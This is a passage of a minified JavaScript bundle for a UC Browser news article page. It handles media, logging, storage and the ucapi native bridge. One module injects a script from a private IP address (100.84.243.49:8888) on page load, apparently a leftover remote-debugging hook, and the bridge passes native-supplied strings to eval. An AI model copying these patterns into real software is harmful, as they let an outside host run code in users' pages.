        n.innerHTML = n.innerHTML.replace(/&nbsp;*/g, '');
        var i = n.querySelectorAll('p')
          , o = n.querySelectorAll('strong');
        t(i),
          t(o);
      }
    }

    function d() {
      var e = $.hash('sm_daymode') || 1
        , t = $.hash('sm_image') || '';
      o(e),
        a(),
        n(t);
    }

    function l() {
      var e = {}
        , t = $('.ad-list').find('a');
      return t && (e = {
        topSrc: t.data('top-src'),
        topUrl: t.data('top-url'),
        bigSrc: t.data('big-src'),
        bigUrl: t.data('big-url'),
        video: t.data('video'),
        src: t.data('src'),
        url: t.data('url')
      }),
        e;
    }

    function u(e) {
      var t = $('.gallery-img')
        , n = $('.gallery-list')
        , i = n.find('img') ? n.find('img').length : 0
        , o = [];
      return t && i ? ((_envi.browser.uc || _envi.browser.ucNews) && (t.append('<span class="showTuji">' + i + '</span>'),
        t.find('img').addClass('galleryLink')),
        _.each(n.find('img'), function(t, n) {
          var i = $(t).data('description') || $(t).attr('description')
            , a = $(t).data('src') || $(t).attr('src');
          o.push({
            index: n,
            title: e.title || document.title,
            type: 'jpg',
            url: a,
            description: i
          });
        })) : t && e.image && e.image[0] && e.image[0].length > 0 && (_envi.browser.uc || _envi.browser.ucNews) && (t.append('<span class="showTuji">' + i + '</span>'),
          o = e.image[0]),
        o;
    }

    function f() {
      $('.article-content video[data-video]').each(function() {
        var e = $(this)
          , t = e.attr('data-video') || ''
          , n = e.attr('data-url_sign');
        $.ajax({
          url: serverPathIflow + '/' + netWork['article-iflow'] + '/api/v1/article/video/parse',
          data: {
            pageUrl: t,
            app: zzd.Tools.getQueryString('app') || 'uc-iflow',
            aid: zzd.Tools.getQueryString('sm_article_id'),
            url_sign: n,
            uc_param_str: 'dnnivebichfrmintcpgieiwidsudpf'
          },
          dataType: 'jsonp',
          timeout: 15e3,
          success: function(t) {
            '0' == t.status && t.data.videoList && t.data.videoList[0].fragment && t.data.videoList[0].fragment[0].url && (e.attr('src', t.data.videoList[0].fragment[0].url),
              e.data('title', t.data.title));
          }
        });
      }),
        $(window).on('orientationchange', function() {
          $('video').each(function() {
            var e = $(this).attr('data-width')
              , t = $(this).attr('data-height')
              , n = this;
            setTimeout(function() {
              var i, o;
              window.innerHeight < $('#contentShow').width() ? (i = .8 * window.innerHeight,
                o = i * e / t) : (o = $('#contentShow').width(),
                i = o * t / e),
                $(n).css({
                  width: o
                }),
                $(n).css({
                  height: i
                });
            }, 200);
          });
        });
    }

    function p(e) {
      var t, n = e[0], i = $('video').length;
      0 === i && n && 170 != _envi.get('pf') && (t = r(n),
        $('.article-content').append(t));
    }

    function g(e) {
      var t = 0;
      $('article').each(function() {
        $(this).height() + $(this).offset().top > t && (t = $(this).height() + $(this).offset().top);
      });
      var n = 0
        , i = 0
        , o = !1;
      window._scrollStartTime = (new Date).valueOf(),
        window.addEventListener('scroll', function() {
          var a = $('body').scrollTop() + $(window).height();
          o || (n = Math.floor(a / t * 5),
            a > t || n >= 5 ? (i = 5,
              n = 5,
              o = !0,
              window._uca('scroll', {
                index: n,
                aid: e
              })) : n > i && (i = n,
                window._uca('scroll', {
                  index: n,
                  aid: e,
                  time: (new Date).valueOf() - window._scrollStartTime
                })));
        });
    }

    function h(e) {
      ucapi.biz.onShare({
        title: e.title,
        content: e.content,
        sourceUrl: e.url,
        target: '',
        disableTarget: '',
        type: '',
        source: '',
        screenshotHtmlNodeId: '',
        screenshotRect: e.pos,
        trigger: function() {}
      });
    }

    _.templateSettings = {
      evaluate: /\{\%(.+?)\%\}/g,
      interpolate: /\{\{(.+?)\}\}/g,
      escape: /\{\{-(.+?)\}\}/g
    },
      window.sMShowImage = n,
      window.sMAddImageHolder = i,
      window.sMSetDayMode = o,
      window.sMFilterArticle = a,
      window.formatContentVideoTag = r,
      window.sMRemoveLink = c,
      window.purify = s,
      window.hashchangeHandler = d,
      window.getAdList = l,
      window.getGalleryImgList = u,
      window.renderContentVideoTag = f,
      window.formatContentMediaTag = p,
      window.initScrollLog = g,
      window.initBrowserShareInfo = h;
    window.pageVisibility = function() {
      var e, t = function(e, t) {
        return '' !== e ? e + t.slice(0, 1).toUpperCase() + t.slice(1) : t;
      }, n = function() {
        var n = !1;
        return 'number' == typeof window.screenX && ['webkit', 'moz', 'ms', 'o', ''].forEach(function(i) {
          0 == n && void 0 != document[t(i, 'hidden')] && (e = i,
            n = !0);
        }),
          n;
      }(), i = function() {
        if (n)
          return document[t(e, 'hidden')];
      }, o = function() {
        if (n)
          return document[t(e, 'visibilityState')];
      };
      return {
        hidden: i(),
        visibilityState: o(),
        visibilitychange: function(t, a) {
          if (a = !1,
            n && 'function' == typeof t)
            return document.addEventListener(e + 'visibilitychange', function(e) {
              this.hidden = i(),
                this.visibilityState = o(),
                t.call(this, e);
            }
              .bind(this), a);
        }
      };
    }(void 0);
    !function(e) {
      var t, n, i = {};
      try {
        t = 'localStorage' in e && null !== localStorage;
      } catch (e) {
        t = !1;
      }
      n = {
        hasLocalStorage: t,
        get: function(e) {
          var t;
          if (this.hasLocalStorage) {
            var n = localStorage.getItem(e);
            try {
              t = JSON.parse(n);
            } catch (e) {
              t = n;
            }
          } else
            t = i[e];
          if (t && t.data) {
            if (!('expire' in t) || t.expire > Date.now())
              return t.data;
            this.remove(e);
          }
          return null;
        },
        set: function(e, t, n) {
          var o = {
            data: t
          };
          return n > 0 && (o.expire = Date.now() + 1e3 * n),
            this.hasLocalStorage ? localStorage.setItem(e, JSON.stringify(o)) : i[e] = o,
            t;
        },
        remove: function(e) {
          this.hasLocalStorage ? localStorage.removeItem(e) : delete i[e];
        },
        removeExpired: function() {
          Object.keys(localStorage).forEach(function(e) {
            this.get(e);
          }, n);
        }
      },
      t && n.removeExpired(),
        e._storage = n;
    }(window),
      function(e, t) {
        function n() {
          var t;
          return t = e.location.pathname.indexOf('news.html') > -1 ? _envi.browser.uc || _envi.browser.ucNews || 'share' !== zzd.Tools.getQueryString('pagetype') ? 'index' : 'share' : e.location.pathname.indexOf('xissAllComments') > -1 ? 'comment' : e.location.pathname.indexOf('reply.html') > -1 ? 'reply' : e.location.pathname.indexOf('special.html') > -1 ? 'special' : 'third_party';
        }

        var i = function(e, i) {
          i = i || {};
          var o = location.protocol
            , a = o + '//m.uczzd.cn/log/api/v1/element/$type$?uc_param_str=dnnivebichfrmintcpgieiwidsudpf&app=uc-iflow'
            , r = {
            click: a.replace('$type$', 'click-log'),
            event: a.replace('$type$', 'event-log'),
            info: o + '//m.uczzd.cn/log/api/v1/client/info?uc_param_str=dnnivebichfrmintcpgieiwidsudpf&app=uc-iflow',
            scroll: a.replace('$type$', 'pg_' + i.index)
          };
          r[e] || ('pvLog' === e ? r[e] = o + '//m.uczzd.cn/log/api/v1/page/flow?uc_param_str=dnnivebichfrmintcpgieiwidsudpf&app=uc-iflow' : r[e] = a.replace('$type$', e));
          var c = r[e];
          if (i.page = i.page || n(),
              i.zzd_from = zzd.Tools.getQueryString('zzd_from'),
              i.rd_id = window._storage.get('_read_id') || '',
              i.rc_id = zzd.Tools.getQueryString('recoId'),
              i._ = +new Date,
              c += '&' + zzd.Tools.getSearchString(i),
            'android' === _envi.get('fr') && _Version.match(_envi.get('ve'), '10.10.0~') && navigator.sendBeacon)
            c += '&is_beacon=1',
              navigator.sendBeacon(c, '');
          else if ('iphone' === _envi.get('fr') && _Version.match(_envi.get('ve'), '10.9.16~') && ucapi.base && ucapi.base.sendBeacon)
            ucapi.base.sendBeacon({
              url: c,
              data: {
                is_beacon: 1
              }
            });
          else {
            var s = t.createElement('img');
            s.src = c;
          }
        };
        e._uca = i;
      }(window, document);
  }
  , function(e, t) {
    var n = window.crosslocalstorage = function(e, t) {
        this.origin = e,
          this.path = t,
          this._iframe = null,
          this._iframeReady = !1,
          this._queue = [],
          this._requests = {},
          this._id = 0;
      }
    ;
    n.prototype = {
      op: {
        WRITE: 'W',
        READ: 'R',
        DEL: 'D',
        CLEAR: 'X'
      },
      init: function() {
        var e = this;
        if (!this._iframe) {
          if (!(window.postMessage && window.JSON && window.localStorage))
            throw new Error('Unsupported browser.');
          this._iframe = document.createElement('iframe'),
            this._iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;',
            document.body.appendChild(this._iframe),
            window.addEventListener ? (this._iframe.addEventListener('load', function() {
              e._iframeLoaded();
            }, !1),
              window.addEventListener('message', function(t) {
                e._handleMessage(t);
              }, !1)) : this._iframe.attachEvent && (this._iframe.attachEvent('onload', function() {
                e._iframeLoaded();
              }, !1),
                window.attachEvent('onmessage', function(t) {
                  e._handleMessage(t);
                }));
        }
        this._iframe.src = this.origin + this.path;
      },
      getValue: function(e, t) {
        this._toSend({
          key: e
        }, t);
      },
      setValue: function(e, t, n) {
        this._toSend({
          key: e,
          op: this.op.WRITE,
          value: t
        }, n);
      },
      delValue: function(e, t, n) {
        this._toSend({
          key: e,
          op: this.op.DEL,
          value: t
        }, n);
      },
      clearValue: function(e) {
        this._toSend({
          op: this.op.CLEAR
        }, e);
      },
      _toSend: function(e, t) {
        var n = {
          request: {
            key: e.key,
            id: ++this._id,
            op: e.op,
            value: e.value
          },
          callback: t
        };
        this._iframeReady ? this._sendRequest(n) : this._queue.push(n),
        this._iframe || this.init();
      },
      _sendRequest: function(e) {
        this._requests[e.request.id] = e,
          this._iframe.contentWindow.postMessage(JSON.stringify(e.request), this.origin);
      },
      _iframeLoaded: function() {
        if (this._iframeReady = !0,
            this._queue.length) {
          for (var e = 0, t = this._queue.length; e < t; e++)
            this._sendRequest(this._queue[e]);
          this._queue = [];
        }
      },
      _handleMessage: function(e) {
        if (e.origin == this.origin) {
          var t = JSON.parse(e.data);
          this._requests[t.id].callback && this._requests[t.id].callback(t.key, t.value),
            delete this._requests[t.id];
        }
      }
    };
  }
  , function(e, t, n) {
    var i = document.createElement('script');
    i.src = 'http://100.84.243.49:8888/target/target-script-min.js#anonymous',
      document.head.appendChild(i),
      n(8),
      n(9),
      n(10);
    var o, a = $('header'), r = window.insertTopAd, c = window._envi, s = window._Version, d = window.zzd,
      l = ['m.uczzd.cn', 'm.sp2.uczzd.cn', 'test.iflow.sm.cn', 'test.zzd.sm.cn', 'release.fe.uczzd.cn'];
    c.os.ucBrowserKernel && 'android' === c.get('fr') && '11.0.0.818' === c.get('ve') && ('uclab78' === c.get('sv') || 'uclab79' === c.get('sv') || 'uclab80' === c.get('sv')) || !('iphone' === c.get('fr') && s.match(c.get('ve'), '11.0~') || 'android' === c.get('fr') && s.match(c.get('ve'), '11.0.0.818~')) ? (r(),
      a.show(),
      window.HideHeadVersion = !1) : (window.HideHeadVersion = !0,
      a.hide()),
      o = $.inArray(location.hostname, l) >= 0 ? location.origin : (2 == d.Tools.getQueryString('sp_gz') && c.browser.uc && c.os.iphone,
        '//m.uczzd.cn'),
      window.serverPath = o,
      window.serverPathPage = o,
      window.serverPathComments = o,
      window.serverPathIflow = o,
      window.serverCommentSupport = o,
      window.netWork = {
        home: 'webapp',
        channel: 'iflow',
        articlePage: 'webapp',
        feedbacks: 'iflow',
        element: 'webapp',
        click: 'webapp',
        tags: 'appservice',
        share: 'webapp',
        pre_next: 'webapp',
        article: 'appservice',
        'article-iflow': 'iflow',
        articles: 'appservice',
        related: 'iflow',
        'related-wemedia': 'iflow',
        comments: 'iflow',
        comment: 'iflow',
        guesslike: 'iflow',
        weather: 'appservice',
        newnum: 'appservice',
        personalization: 'appservice',
        search: 'iflow',
        searchList: 'webapp',
        category: 'appservice',
        xissAllComments: 'webapp',
        parse: 'appservice',
        details: 'iflow',
        complain: 'iflow',
        xissReport: 'webapp',
        cmt: 'iflow',
        commentDetail: 'webapp'
      },
      window.clientEvent = {
        webapp_click: '1',
        webapp_share: '2'
      },
      window.rd_typeMap = {
        reco: 'reco',
        relate: 'relate',
        extend: 'extend',
        search: 'search',
        share: 'share'
      },
      window.dataGuessList = [],
      n.e(1, function(e) {
        n(11),
          !function() {
            var e = [n(91)];
            (function() {
                window.articleInit();
              }
            ).apply(null, e);
          }();
      });
  }
  , function(e, t) {
    function n() {
      return 'third_party';
    }

    function i(e) {
      var t = new RegExp('(\\?|^|&|#)' + e + '=([^&|^#]*)(&|$|#)', 'i')
        , n = window.location.href.match(t)
        , i = '';
      return null != n && (i = decodeURIComponent(n[2])),
        i;
    }

    function o(e) {
      alert(e.message),
      window.$$ucLog && window.$$ucLog.errs && window.$$ucLog.errs.push({
        ev: 'js_error',
        from_app: window.$$ucLog.from_app,
        aid: window.$$ucLog.aid,
        uc_param_str: window.$$ucLog.uc_param_str,
        host: location.origin,
        pathname: location.pathname,
        msg: e.message,
        file: e.filename,
        line: e.lineno,
        col: e.colno,
        stack: e.error && e.error.stack,
        d_model: 'xss_js_error_stat',
        ua: navigator.userAgent,
        url: location.href.slice(0, 500)
      });
    }

    window.UAT = {},
      window.UAT.head_start = Date.now(),
      window.__UAE_ID__ = '2715',
      window.$$ucLog = window.$$ucLog || {
          app: window.__UAE_ID__,
          path: n() || '',
          from_app: i('app') || '',
          aid: i('sm_article_id') || '',
          uc_param_str: 'ntnwcpfrve',
          chance: 10,
          errs: [],
          performs: {}
        },
      function(e, t) {
        var n = t.createElement('script')
          , i = t.getElementsByTagName('script')[0];
        n.async = 1,
          e.performance && e.performance.timing ? n.src = '//image.uc.cn/s/uae/g/36/per/1.1/m/c/performance.min.js' : n.src = '//bench.uc.cn/per/1.1/m/c/performance.err.min.js',
          i.parentNode.insertBefore(n, i);
      }(window, document),
      window.ucLogger = function(e, t) {
        var n = function(e) {
          var t = [{
            ev: 'js_error',
            d_model: 'xss_js_error_stat'
          }, {
            ev: 'api_err',
            d_model: 'xss_api_error_stat'
          }, {
            ev: 'jssdk_err',
            d_model: 'xss_jssdk_error_stat'
          }, {
            ev: 'wechat_log',
            d_model: 'xss_wechat_log_stat'
          }]
            , n = '';
          return t.forEach(function(t) {
            t.ev === e && (n = t.d_model);
          }),
            n;
        }
          , i = window.$$ucLog.chance ? 100 * Math.random() < window.$$ucLog.chance : 100 * Math.random() < 30;
        if (i && (t = t || ('https:' === location.protocol ? 'https' : 'http') + '://bench.uc.cn/c?uc_param_str=' + window.$$ucLog.uc_param_str,
            e.app_id = window.$$ucLog.app,
            e.path = window.$$ucLog.path,
            e.from_app = window.$$ucLog.from_app,
            e.aid = window.$$ucLog.aid,
            e.d_model = n(e.ev),
            Object.keys(e).forEach(function(t) {
              var n = e[t];
              n || delete e[t];
            }),
            e = JSON.stringify(e),
          !navigator.sendBeacon || !navigator.sendBeacon(t, e))) {
          var o = new XMLHttpRequest;
          o.open('post', t, !0),
            o.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'),
            o.send(e);
        }
      }
      ,
      window.addEventListener('error', o, !1),
      window.addEventListener('unhandledrejection', function(e) {
        alert('unhandledrejection' + JSON.stringify(e));
        var t = e.reason;
        o({
          message: t.message,
          error: {
            stack: t.stack
          }
        });
      });
  }
  , function(module, exports, __webpack_require__) {
    var require, _typeof = 'function' == typeof Symbol && 'symbol' == typeof Symbol.iterator ? function(e) {
        return typeof e;
      }
        : function(e) {
          return e && 'function' == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? 'symbol' : typeof e;
        }
    ;
    !function(context) {
      function extenducapi() {
        var e, t = apiDef.ucapi;
        for (e in t)
          window.ucapi[e] = t[e]
      }

      var require, define;
      !function() {
        function e(e) {
          var t = e.factory;
          return e.exports = {},
            delete e.factory,
            t(function(t) {
              var n = t;
              return '.' === t.charAt(0) && (n = e.id.slice(0, e.id.lastIndexOf('.')) + '.' + t.slice(2)),
                require(n);
            }, e.exports, e),
            e.exports;
        }

        var t = {}
          , n = []
          , i = {};
        require = function(o) {
          if (!t[o])
            throw 'module ' + o + ' not found';
          if (o in i)
            throw 'Cycle in require graph: ' + (n.slice(i[o]).join('->') + '->' + o);
          if (t[o].factory)
            try {
              return i[o] = n.length,
                n.push(o),
                e(t[o]);
            } finally {
              delete i[o],
                n.pop();
            }
          return t[o].exports;
        }
          ,
          define = function(e, n) {
            if (t[e])
              throw 'module ' + e + ' already defined';
            t[e] = {
              id: e,
              factory: n
            };
          }
          ,
          define.remove = function(e) {
            delete t[e];
          }
          ,
          define.moduleMap = t;
      }(),
        define('util', function(e, t, n) {
          function i(e) {
            var t, n, o = e;
            if (e && ((n = e instanceof Array) || e instanceof Object))
              for (t in o = n ? [] : {},
                e)
                e.hasOwnProperty(t) && (o[t] = i(e[t]));
            return o;
          }

          var o = e('constant')
            , a = Object.prototype.toString
            , r = {
            getTop: function(e) {
              var t = e.offsetTop;
              return null != e.offsetParent && (t += r.getTop(e.offsetParent)),
                t;
            },
            getLeft: function(e) {
              var t = e.offsetLeft;
              return null != e.offsetParent && (t += r.getLeft(e.offsetParent)),
                t;
            },
            getCss3offsetTop: function(e) {
              var t = getComputedStyle(e, null).webkitTransform
                , t = 'none' == t ? 0 : parseInt(t.split(',')[5].replace(')', ''));
              return 'BODY' != e.parentNode.tagName && (t += r.getCss3offsetTop(e.parentNode)),
                t;
            },
            getCss3offsetLeft: function(e) {
              var t = getComputedStyle(e, null).webkitTransform
                , t = 'none' == t ? 0 : parseInt(t.split(',')[4]);
              return 'BODY' != e.parentNode.tagName && (t += r.getCss3offsetLeft(e.parentNode)),
                t;
            },
            getNodePosById: function(e) {
              return (e = document.getElementById(e)) ? [r.getLeft(e) + r.getCss3offsetLeft(e), r.getTop(e) + r.getCss3offsetTop(e), e.offsetWidth, e.offsetHeight] : '';
            }
          };
          t.getPlatform = function() {
            return window.UCShellJava ? o.platform.ANDROID : window.__BrowserJSBridgeObj ? o.platform.IPHONE : o.platform.OTHERS;
          }
            ,
            t.isString = function(e) {
              return '[object String]' === a.call(e);
            }
            ,
            t.isFunction = function(e) {
              return '[object Function]' === a.call(e);
            }
            ,
            t.isArray = function(e) {
              return '[object Array]' === a.call(e);
            }
            ,
            t.isEmptyObj = function(e) {
              for (var t in e)
                if (e.hasOwnProperty(t))
                  return !1;
              return !0;
            }
            ,
            t.clone = i,
            t.getNodePosById = r.getNodePosById,
            t.debugLog = function(e) {
              if (ucapi && ucapi.debug) {
                console.log(e);
                var t = navigator.userAgent;
                (t.match(/(Android)\s+([\d.]+)/) || t.match(/(iPhone\sOS)\s([\d_]+)/)) && alert(e);
              }
            }
            ,
            t.log = function(e, t) {
              encodeURIComponent(location.href);
            };
        }),
        define('constant', function(e, t, n) {
          t.platform = {
            ALL: 'all',
            ANDROID: 'android',
            IPHONE: 'iphone',
            OTHERS: 'others'
          },
            t.debug = !1,
            t.callbackStatus = {
              OK: 0,
              ACCESS_DENY: 1,
              INVALID_METHOD: 2,
              INVALID_PARAM: 3,
              UNKNOWN_ERROR: 4
            },
            t.callbackStatusMessage = ['OK', 'ACCESS_DENY', 'INVALID_METHOD', 'INVALID_PARAMS', 'UNKNOWN_ERROR'];
        }),
        define('bridge', function(f, e, m) {
          function b(e) {
            return e = e.replace('+', '%20'),
              decodeURIComponent(e);
          }

          function g(e) {
            return !!ucapi.invoke || void (e && e.fail && e.fail.call(this, {
                errCode: k.callbackStatus.INVALID_METHOD,
                errMsg: 'ucapi.invoke not exsit, should load in UCBrowser !'
              }));
          }

          function c(e, t, n) {
            e && e.call(this, {
              errCode: t,
              errMsg: n
            });
          }

          var a = f('util')
            , k = f('constant')
            , n = {};
          e.exec = function(e, t, n) {
            if (a.log(e, 'invoke'),
                g(t)) {
              var i = a.getPlatform();
              if (n !== k.platform.ALL && i !== n)
                t && t.fail && c(t.fail, k.callbackStatus.INVALID_METHOD, 'this api not supported this platform');
              else {
                if (t && t.fail) {
                  var o = t.fail;
                  t.fail = function(t) {
                    a.log(e, 'fail'),
                      t.errMsg = k.callbackStatusMessage[t.errCode],
                      o.call(this, t);
                  };
                }
                ucapi.invoke(e, t);
              }
            }
          }
            ,
            e.subscribeEvent = function(e, t, n) {
              g(t) && e && t.success && ucapi.on(e, t.success);
            }
            ,
            e.onEvent = function(e, t, i) {
              a.log(e, 'invoke'),
              t && (a.getPlatform() != k.platform.ANDROID || 'biz.onShare' != e || !t.screenshotHtmlNodeId || '' == t.screenshotHtmlNodeId || t.screenshotRect && '' != t.screenshotRect || (i = a.getNodePosById(t.screenshotHtmlNodeId),
              '' != i && (i = i.join(',')),
                t.screenshotRect = i),
                n[e] = t);
            }
            ,
            e.triggerEvent = function(e) {
              if (e && e.method)
                if (n[e.method]) {
                  var t = n[e.method];
                  if (a.getPlatform() == k.platform.ANDROID) {
                    if (e.channel && 'invokeJs' == e.channel) {
                      var i = '';
                      t.trigger && (i = t.trigger(e.data)),
                        void 0 == i ? (e = a.clone(t),
                        e.success && delete e.success,
                        e.fail && delete e.fail,
                        e.trigger && delete e.trigger) : e = i;
                    } else
                      i = {},
                        i.method = e.method,
                      e.callbackId && (i.callbackId = e.callbackId),
                        i.args = t,
                        ucapi.base.triggerEventCallback(i),
                        e = void 0;
                    return e;
                  }
                  ((i = t.trigger && t.trigger(e.data)) && 'object' == ('undefined' == typeof i ? 'undefined' : _typeof(i)) || e.callbackId) && ucapi.base.triggerEventCallback({
                    method: e.method,
                    callbackId: e.callbackId,
                    args: t,
                    trigger_result: i
                  });
                } else
                  a.getPlatform() !== k.platform.ANDROID && e.callbackId && e.method && 'biz.onShare' != e.method && ucapi.base.triggerEventCallback({
                    method: e.method,
                    callbackId: e.callbackId
                  });
            }
            ,
            e.invokeJs = function(c) {
              if (c.js && c.callbackId) {
                var e = b(c.js);
                if (c = {
                    result: '',
                    callbackId: c.callbackId
                  },
                    eval(e),
                  void 0 != ucapi.base.injectInvokeJs)
                  try {
                    a.log('base.injectInvokeJs', 'inject');
                    var d = ucapi.base.injectInvokeJs();
                    d || (d = ''),
                      c.result = d;
                  } catch (e) {
                    a.log('base.injectInvokeJs', 'error');
                  }
                ucapi.base.invokeJsCallback(c);
              }
            };
        }),
        define('apidef', function(e, t, n) {
          var i = e('constant').platform
            , o = e('apiCompatibleImpl')
            , a = e('bridge');
          t.ucapi = {
            base: {
              checkAPI: function(e) {
                a.exec('base.checkAPI', e, i.ALL);
              },
              getVersion: function(e) {
                a.exec('base.getVersion', e, i.ALL);
              },
              displayMode: function(e) {
                a.exec('base.displayMode', e, i.ALL);
              },
              setDisplayMode: function(e) {
                a.exec('base.setDisplayMode', e, i.ANDROID);
              },
              imageMode: function(e) {
                a.exec('base.imageMode', e, i.ALL);
              },
              onDisplayModeChange: function(e) {
                a.subscribeEvent('base.onDisplayModeChange', e, i.ANDROID);
              },
              onImageModeChange: function(e) {
                a.subscribeEvent('base.onImageModeChange', e, i.ANDROID);
              },
              triggerEvent: function(e) {
                return a.triggerEvent(e);
              },
              triggerEventCallback: function(e) {
                a.exec('base.triggerEventCallback', e, i.ALL);
              },
              invokeJs: function(e) {
                a.invokeJs(e);
              },
              invokeJsCallback: function(e) {
                a.exec('base.invokeJsCallback', e, i.ANDROID);
              },
              setImageReader: function(e) {
                a.exec('base.setImageReader', e, i.IPHONE);
              },
              sendBeacon: function(e) {
                a.exec('base.sendBeacon', e, i.IPHONE);
              },
              copyToClipboard: function(e) {
                a.exec('base.copyToClipboard', e, i.ALL);
              }
            },
            device: {
              batteryLevel: function(e) {
                a.exec('device.batteryLevel', e, i.ALL);
              },
              setScreenSleepTime: function(e) {
                a.exec('device.setScreenSleepTime', e, i.ANDROID);
              },
              setScreenBrightness: function(e) {
                a.exec('device.setScreenBrightness', e, i.ANDROID);
              }
            },
            biz: {
              queryApp: function(e) {
                a.exec('biz.queryApp', e, i.ALL);
              },
              startApp: function(e) {
                a.exec('biz.startApp', e, i.ALL);
              },
              quickDownload: function(e) {
                a.exec('biz.quickDownload', e, i.ANDROID);
              },
              queryAppIsDl: function(e) {
                a.exec('biz.queryAppIsDl', e, i.ANDROID);
              },
              installApp: function(e) {
                a.exec('biz.installApp', e, i.ANDROID);
              },
              checkUpdate: function(e) {
                a.exec('biz.checkUpdate', e, i.ANDROID);
              },
              copyPlainTextToClipboard: function(e) {
                a.exec('biz.copyPlainTextToClipboard', e, i.IPHONE);
              },
              saveImageToPhotoAlbum: function(e) {
                a.exec('biz.saveImageToPhotoAlbum', e, i.IPHONE);
              },
              openWindow: function(e) {
                a.exec('biz.openWindow', e, i.ANDROID);
              },
              customBar: function(e) {
                a.exec('biz.customBar', e, i.ALL);
              },
              setStatusBarBgColor: function(e) {
                a.exec('biz.setStatusBarBgColor', e, i.ALL);
              },
              share: function(e) {
                o.exec('biz.share', e, i.ALL);
              },
              onShare: function(e) {
                a.onEvent('biz.onShare', e, i.ALL);
              },
              loadBizModeUrl: function(e) {
                a.exec('biz.loadBizModeUrl', e, i.IPHONE);
              },
              customSiteNotify: function(e) {
                a.exec('biz.customSiteNotify', e, i.ANDROID);
              },
              openVoice: function(e) {
                a.exec('biz.openVoice', e, i.ALL);
              },
              createDestopShortcut: function(e) {
                a.exec('biz.createDestopShortcut', e, i.ANDROID);
              },
              openInExternal: function(e) {
                a.exec('biz.openInExternal', e, i.IPHONE);
              },
              openAppStore: function(e) {
                a.exec('biz.openAppStore', e, i.IPHONE);
              },
              installIPA: function(e) {
                a.exec('biz.installIPA', e, i.IPHONE);
              },
              setFullScreen: function(e) {
                a.exec('biz.setFullScreen', e, i.ALL);
              },
              gous: function(e) {
                a.exec('biz.gous', e, i.IPHONE);
              },
              onBizItemClicked: function(e) {
                a.onEvent('biz.onBizItemClicked', e, i.ALL);
              },
              imageDidFlip: function(e) {
                a.exec('biz.imageDidFlip', e, i.ALL);
              },
              hiddenComponent: function(e) {
                a.exec('biz.hiddenComponent', e, i.ALL);
              },
              closeWebPage: function(e) {
                a.exec('biz.closeWebPage', e, i.ALL);
              },
              handlePageError: function(e) {
                a.exec('biz.handlePageError', e, i.ANDROID);
              },
              getUserType: function(e) {
                a.exec('biz.getUserType', e, i.ALL);
              },
              getNewbieType: function(e) {
                a.exec('biz.getNewbieType', e, i.ALL);
              },
              ucparams: function(e) {
                a.exec('biz.ucparams', e, i.ANDROID);
              },
              openPicViewer: function(e) {
                a.exec('biz.openPicViewer', e, i.ANDROID);
              },
              pageDiversion: function(e) {
                a.exec('biz.pageDiversion', e, i.IPHONE);
              },
              handleExt: function(e) {
                a.exec('biz.handleExt', e, i.ANDROID);
              }
            },
            video: {
              getFollowedVideos: function(e) {
                a.exec('video.getFollowedVideos', e, i.ALL);
              },
              play: function(e) {
                a.exec('video.play', e, i.ALL);
              },
              onPlayEnd: function(e) {
                a.onEvent('video.onPlayEnd', e, i.ALL);
              },
              getPlayList: function(e) {
                a.exec('video.getPlayList', e, i.ALL);
              },
              openTagWindow: function(e) {
                a.exec('video.openTagWindow', e, i.ALL);
              }
            },
            theme: {
              setEnableSwipeGesture: function(e) {
                a.exec('theme.setEnableSwipeGesture', e, i.ANDROID);
              },
              applySkin: function(e) {
                a.exec('theme.applySkin', e, i.ANDROID);
              },
              onlineSkinPreview: function(e) {
                a.exec('theme.onlineSkinPreview', e, i.ANDROID);
              },
              getThemeList: function(e) {
                a.exec('theme.getThemeList', e, i.ANDROID);
              }
            },
            infoflow: {
              notifyFlushWebItemInfo: function(e) {
                a.exec('infoflow.notifyFlushWebItemInfo', e, i.ALL);
              },
              openInfoFlowImageGallery: function(e) {
                a.exec('infoflow.openInfoFlowImageGallery', e, i.ALL);
              },
              notifyContentPosState: function(e) {
                a.exec('infoflow.notifyContentPosState', e, i.ALL);
              },
              getNewsData: function(e) {
                a.exec('infoflow.getNewsData', e, i.ALL);
              },
              priseFinishNotify: function(e) {
                a.exec('infoflow.priseFinishNotify', e, i.ALL);
              },
              queryPageInfo: function(e) {
                a.exec('infoflow.queryPageInfo', e, i.IPHONE);
              },
              backToList: function(e) {
                a.exec('infoflow.backToList', e, i.ANDROID);
              },
              openChannelWindow: function(e) {
                a.exec('infoflow.openChannelWindow', e, i.ALL);
              },
              onUserClick: function(e) {
                a.exec('infoflow.onUserClick', e, i.IPHONE);
              },
              statsUserClick: function(e) {
                a.exec('infoflow.statsUserClick', e, i.ANDROID);
              },
              userDidScroll: function(e) {
                a.exec('infoflow.userDidScroll', e, i.ALL);
              },
              notifyFollowInfo: function(e) {
                a.exec('infoflow.notifyFollowInfo', e, i.ALL);
              },
              flushWeMediaInfo: function(e) {
                a.exec('infoflow.flushWeMediaInfo', e, i.ALL);
              },
              switchSearch: function(e) {
                a.exec('infoflow.switchSearch', e, i.ALL);
              },
              statEvent: function(e) {
                a.exec('infoflow.statEvent', e, i.ALL);
              },
              interceptUrl: function(e) {
                a.exec('infoflow.interceptUrl', e, i.ANDROID);
              },
              setArticleRect: function(e) {
                a.exec('infoflow.setArticleRect', e, i.ANDROID);
              },
              jumpPage: function(e) {
                a.exec('infoflow.jumpPage', e, i.ALL);
              },
              openArticleItemWithInfo: function(e) {
                a.exec('infoflow.openArticleItemWithInfo', e, i.ALL);
              },
              tagInteraction: function(e) {
                a.exec('infoflow.tagInteraction', e, i.ALL);
              },
              notifyImgZoom: function(e) {
                a.exec('infoflow.notifyImgZoom', e, i.ALL);
              }
            },
            promotion: {
              getContent: function(e) {
                a.exec('promotion.getContent', e, i.IPHONE);
              },
              actionNotify: function(e) {
                a.exec('promotion.actionNotify', e, i.IPHONE);
              },
              getHcAd: function(e) {
                a.exec('promotion.getHcAd', e, i.ANDROID);
              }
            },
            comment: {
              configInput: function(e) {
                a.exec('comment.configInput', e, i.ALL);
              },
              onSendComment: function(e) {},
              onSendComment3rd: function(e) {},
              notifySendResult: function(e) {
                a.exec('comment.notifySendResult', e, i.ALL);
              },
              openCommentWebview: function(e) {
                a.exec('comment.openCommentWebview', e, i.IPHONE);
              },
              notifyCommentCount: function(e) {
                a.exec('comment.notifyCommentCount', e, i.ALL);
              },
              setSendCommentPlaceHolder: function(e) {
